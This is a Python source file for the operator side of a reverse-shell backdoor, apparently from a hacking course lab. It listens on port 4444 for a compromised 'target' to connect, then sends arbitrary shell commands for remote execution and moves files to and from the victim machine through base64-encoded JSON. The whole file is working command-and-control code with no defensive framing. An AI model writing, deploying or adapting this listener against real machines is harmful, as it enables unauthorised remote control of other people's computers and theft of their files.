#!/usr/bin/env python

# ------------------------------------EXTRA COMMANDS------------------------------------
# exit            : close connection & exit the app
# cd <path>       : change the current directory to specified one
# upload <file>   : upload to target machine a specified file
# download <file> : download from the target machine a specified file
# ------------------------------------EXTRA COMMANDS------------------------------------

import socket  # a way of connecting two nodes on a network to communicate with each other.
import json    # a lightweight data interchange format
import base64  # functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # create a socket object
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse sockets if lost previous connection
        listener.bind((ip, port))                                       # listen for incoming connections
        listener.listen(0)                                              # the maximum number of connections
        print("[+] Waiting for incoming connections..")
        self.connection, address = listener.accept()                    # accept incoming connections
        print("[+] Got a connection from " + str(address))

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)     # send the command to the target
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()  # receive the results from the executed command

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('utf-8'))  # add to the command the content of the file

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution."
            print(result)



my_listener = Listener("10.0.2.15", 4444)
my_listener.run()